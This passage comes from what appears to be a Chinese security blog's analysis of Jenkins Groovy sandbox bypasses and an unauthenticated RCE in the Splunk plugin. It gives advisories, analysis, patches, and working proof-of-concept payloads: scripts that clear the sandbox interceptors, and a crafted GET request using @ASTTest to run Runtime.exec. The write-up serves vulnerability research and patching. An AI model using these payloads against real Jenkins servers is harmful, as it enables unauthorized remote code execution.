+<p><code>org.kohsuke.groovy.sandbox.GroovyInterceptor</code>是一个拦截器类，功能是为当前线程创建相应方法的拦截器，在接收拦截之前，需要通过<code>GroovyInterceptor#register()</code>注册，相关方法在</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568858988658.png" alt="1568858988658" /></p>
+
+<p>在script-security 1.58版本中把这部分代码放到了GroovySandbox.Scope enter()方法中</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568859792340.png" alt="1568859792340" /></p>
+
+<p>而register()方法的功能是通过<code>threadInterceptors.get().add()</code>为当前线程注册拦截器</p>
+
+<pre><code class="language-java">public void register() {
+    ((List)threadInterceptors.get()).add(this);
+}
+</code></pre>
+
+<p>该漏洞的利用点就是在<code>threadInterceptors.get()</code>获取到线程信息之后，再调用clear()方法清除当前线程的所有拦截器，使黑名单失效，然后就可以注入自定义代码来绕过沙箱</p>
+
+<p>本地测试一下</p>
+
+<pre><code class="language-groovy">({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); &quot;calc&quot; }()).execute();
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568861762489.png" alt="1568861762489" /></p>
+
+<p>但是直接发送这个脚本会被<code>org.jenkinsci.plugins.scriptsecurity.sandbox.whitelists.StaticWhitelist#rejectStaticField()</code>拦截，于是可以在<code>execute</code>之前利用<code>.&amp;</code>操作符绕过</p>
+
+<p>或者利用这个<a href="https://github.com/jenkinsci/groovy-sandbox/issues/54">issue</a>的方式，在此处<code>.&amp;</code>并没有起到实质调用的作用，只是为了绕过Jenkins对<code>staticField</code>的检查</p>
+
+<h4 id="poc-7">PoC</h4>
+
+<p>PoC的变化也多种多样，可以通过上面分析的<code>Matrix Project Plugin</code>插件触发</p>
+
+<ul>
+<li><p>Poc1</p>
+
+<pre><code class="language-java">({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); &quot;calc&quot; }().&amp;toString).execute();
+</code></pre></li>
+
+<li><p>PoC2</p>
+
+<pre><code class="language-java">1.&amp;({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); 'x' }()); 'calc'.execute()
+</code></pre></li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568792275964.png" alt="1568792275964" /></p>
+
+<h4 id="补丁-4">补丁</h4>
+
+<ul>
+<li>jenkinsci/groovy-sandbox <a href="https://github.com/jenkinsci/groovy-sandbox/commit/e30cd28d7b30cd606e78c22174cb04e0450244a7">commit</a></li>
+<li>概述：在方法指针表达式增加了transform检查</li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568801252778.png" alt="1568801252778" /></p>
+
+<h3 id="security-1538">SECURITY-1538</h3>
+
+<ul>
+<li>公告：<a href="https://jenkins.io/security/advisory/2019-09-12/#SECURITY-1538">https://jenkins.io/security/advisory/2019-09-12/#SECURITY-1538</a></li>
+<li>CVE：CVE-2019-10393, CVE-2019-10394, CVE-2019-10399, CVE-2019-10400</li>
+<li>插件：Script Security</li>
+<li>影响版本：&lt;=1.62</li>
+</ul>
+
+<h4 id="概述-1">概述</h4>
+
+<p>该问题与<a href="https://jenkins.io/security/advisory/2019-07-31/#SECURITY-1465%20(2)">SECURITY-1465</a>一样，由于groovy语法特性导致绕过，此次利用的是方法调用表达式，可以通过<code>()</code>运算符直接调用call方法，如：</p>
+
+<pre><code class="language-java">class MyCallable {
+    int call(int x) {           
+        2*x
+    }
+}
+def mc = new MyCallable()
+assert mc.call(2) == 4          
+assert mc(2) == 4   
+</code></pre>
+
+<p>参考：<a href="http://docs.groovy-lang.org/latest/html/documentation/core-operators.html#method-pointer-operator">http://docs.groovy-lang.org/latest/html/documentation/core-operators.html#method-pointer-operator</a></p>
+
+<p>同理，自增(<code>++</code>)自减(<code>--</code>)运算符也能间接调用到方法</p>
+
+<h4 id="分析-4">分析</h4>
+
+<p>本质上还是通过<code>threadInterceptors.get().clear()</code>清除拦截器再执行任意代码</p>
+
+<h4 id="poc-8">PoC</h4>
+
+<ul>
+<li><p>poc1</p>
+
+<pre><code class="language-java">'calc'.({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); &quot;execute&quot; }())();
+</code></pre></li>
+
+<li><p>poc2</p>
+
+<pre><code class="language-java">++({ org.kohsuke.groovy.sandbox.GroovyInterceptor.threadInterceptors.get().clear(); &quot;toString&quot; }());
+'calc'.execute()
+</code></pre></li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568792171461.png" alt="1568792171461" /></p>
+
+<h4 id="补丁-5">补丁</h4>
+
+<ul>
+<li>jenkinsci/groovy-sandbox <a href="https://github.com/jenkinsci/groovy-sandbox/commit/e30cd28d7b30cd606e78c22174cb04e0450244a7">commit</a></li>
+<li>概述：对方法调用表达式以及递增递减表达式都做了处理</li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568863989383.png" alt="1568863989383" /></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568864020702.png" alt="1568864020702" /></p>
+
+<h3 id="security-1294">SECURITY-1294</h3>
+
+<ul>
+<li>公告：<a href="https://jenkins.io/security/advisory/2019-08-28/#SECURITY-1294">https://jenkins.io/security/advisory/2019-08-28/#SECURITY-1294</a></li>
+<li>CVE-2019-10390</li>
+<li>插件：Splunk Plugin</li>
+<li>影响版本：&lt;=1.7.4</li>
+<li>利用点
+
+<ul>
+<li><code>com.splunk.splunkjenkins.SplunkJenkinsInstallation#doCheckScriptContent</code></li>
+</ul></li>
+</ul>
+
+<h4 id="分析-5">分析</h4>
+
+<p>通过上面分析的descriptorByName可以直接调用到指定的类，注意到SplunkJenkinsInstallation类的<code>doCheckScriptContent</code>方法，该方法调用了</p>
+
+<p><code>LogEventHelper.validateGroovyScript(value)</code></p>
+
+<p>该方法对script进行了解析，而参数value的值直接从request获取，因此传入精心构造的脚本可导致任意代码执行</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1567144975420.png" alt="1567144975420" /></p>
+
+<h4 id="poc-9">PoC</h4>
+
+<pre><code>GET /descriptorByName/com.splunk.splunkjenkins.SplunkJenkinsInstallation/checkScriptContent?value=import%20groovy.transform.*%0a@ASTTest(value={assert%20java.lang.Runtime.getRuntime().exec(%22calc%22)})%0aclass%20ASTTestPoc{}
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1567144024727.png" alt="1567144024727" /></p>
+
+<h4 id="补丁-6">补丁</h4>
+
+<ul>
+<li>jenkinsci/splunk-devops-plugin <a href="https://github.com/jenkinsci/splunk-devops-plugin/commit/58db2878a7faa4c34f73774f28740e5ac8041928">commit</a></li>
+<li>版本：1.8.0</li>
+<li>概述：引入GroovySandbox在解析前对Groovy脚本进行校验</li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1567144462308.png" alt="1567144462308" /></p>
+
+<h2 id="总结">总结</h2>
+
+<p>本报告分析了Jenkins动态路由机制和路由绕过的问题，并讨论了在主流插件Script Security中针对Groovy沙箱的绕过方法，其中最巧妙的是利用自身路由白名单绕过登录检查并结合Groovy语法达到远程代码执行，是一条非常精彩的利用链。</p>
+
+<p>在修复方式上，可以看出Jenkins对于沙箱问题采取的防护方法是黑名单+白名单的方式，对安全的控制还是比较好的，不少问题都出在Groovy的语法特性上，使得较小权限的用户可以突破沙箱执行任意代码，相信以后也会有更巧妙的方式来绕过沙箱，欢迎大家探讨。</p>
+
+<p>参考</p>
+
+<ul>
+<li><a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</a></li>
+<li><a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html">http://docs.groovy-lang.org/latest/html/documentation/grape.html</a></li>
+<li><a href="http://docs.groovy-lang.org/latest/html/documentation/core-operators.html">http://docs.groovy-lang.org/latest/html/documentation/core-operators.html</a></li>
+</ul>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/jenkins-%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E4%B8%8B\/';
+    var disqus_title = 'Jenkins 路由解析及沙箱绕过漏洞分析报告(下)';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/jenkins-%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E4%B8%8B\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2020 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
